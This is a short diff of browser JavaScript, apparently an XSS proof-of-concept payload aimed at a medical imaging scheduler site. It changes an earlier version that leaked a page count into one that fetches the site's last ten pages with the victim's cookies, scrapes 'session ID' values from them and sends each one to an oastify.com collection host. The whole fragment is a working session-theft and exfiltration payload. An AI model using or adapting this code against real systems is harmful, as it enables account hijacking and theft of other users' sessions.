@@ -7,8 +7,17 @@ fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cPage=1&cCo
 .then(r=>r.text())
 .then(t=>{
 let m=t.match(/<A[^>]+href="JavaScript:\s*redirPage_eP\('\/scheduler\/valueSelectorPopupTable\.jsp\?cPage=(\d+)'\)">Last<\/a>/i);
-if(m) fetch('https://qhbh6mfx3whnldsefhpxqwuvdmjd75ct1.oastify.com?lastpage='+m[1],{mode:'no-cors'});
+if(m){
+let last=parseInt(m[1],10);
+for(let p=last;p>last-10;p--){
+fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cPage='+p+'&cContext='+ctx,{credentials:'include'})
+.then(r=>r.text())
+.then(t=>{
+let s=t.match(/logged in;\s*session ID:\s*([^;]+);/i);
+if(s) fetch('https://288txy69u88zcpjq6tg9h8l74yapyh25r.oastify.com?'+encodeURIComponent(s[1].trim()),{mode:'no-cors'});
+});
+}
+}
 });
 }
 })();
-
